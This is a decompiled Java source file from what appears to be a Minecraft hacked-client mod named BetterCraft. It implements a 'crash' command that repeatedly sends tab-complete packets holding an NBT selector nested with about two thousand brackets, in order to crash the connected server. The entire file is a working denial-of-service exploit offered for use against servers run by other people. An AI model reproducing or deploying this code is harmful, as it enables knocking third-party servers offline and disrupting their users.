/*
 * Decompiled with CFR 0.152.
 */
package me.nzxtercode.bettercraft.client.commands.impl;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import me.nzxtercode.bettercraft.client.BetterCraft;
import me.nzxtercode.bettercraft.client.commands.Command;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiNewChat;
import net.minecraft.network.play.client.C14PacketTabComplete;
import net.minecraft.util.ChatComponentText;

public class CompletionCrashCommand
extends Command {
    private static final Minecraft mc = Minecraft.getMinecraft();
    private static final String[] workingMessages = new String[]{"msg", "minecraft:msg", "tell", "minecraft:tell", "tm", "teammsg", "minecraft:teammsg", "minecraft:w", "minecraft:me"};

    public CompletionCrashCommand() {
        super("crash", "servercrasher");
    }

    @Override
    public void run(String alias, String[] args) {
        CompletableFuture.runAsync(() -> {
            try {
                GuiNewChat guiNewChat = CompletionCrashCommand.mc.ingameGUI.getChatGUI();
                BetterCraft.getInstance();
                guiNewChat.printChatMessage(new ChatComponentText(String.valueOf(BetterCraft.clientPrefix) + "Trying crashing server..."));
                Thread.sleep(1500L);
                String message = "minecraft:msg @a[nbt={PAYLOAD}]";
                int i2 = 0;
                while (i2 < 5) {
                    mc.getNetHandler().addToSendQueue(new C14PacketTabComplete(message.replace("{PAYLOAD}", this.generateJsonObject(2048 - message.length()))));
                    ++i2;
                }
            }
            catch (StackOverflowError stackOverflowError) {
            }
            catch (InterruptedException interruptedException) {
                // empty catch block
            }
        });
    }

    @Override
    public List<String> autocomplete(int arg2, String[] args) {
        return new ArrayList<String>();
    }

    private String generateJsonObject(int levels) {
        return "{a:" + IntStream.range(0, levels).mapToObj(i2 -> "[").collect(Collectors.joining()) + "}";
    }
}

